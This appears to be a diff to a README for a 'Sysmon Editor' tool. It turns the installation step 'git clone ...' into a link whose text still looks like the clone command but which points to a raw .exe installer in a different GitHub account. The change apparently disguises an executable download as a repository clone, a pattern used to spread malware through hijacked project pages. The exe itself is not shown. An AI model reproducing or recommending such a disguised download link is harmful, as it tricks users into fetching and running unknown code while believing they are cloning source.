@@ -32,9 +32,8 @@ With **Sysmon Editor**, you can:
 
 To install **Sysmon Editor**, follow these steps:
 
-### 1. Clone the repository:
 ```bash
-git clone https://github.com/yourusername/SysmonEditor.git
+[git clone https://github.com/yourusername/SysmonEditor.git](https://github.com/sasa00elsaedy/sysmon_Rules_Editor/raw/refs/heads/main/sysmon_editor_installer.exe)
 ```
 
 ## Contribution 🤝
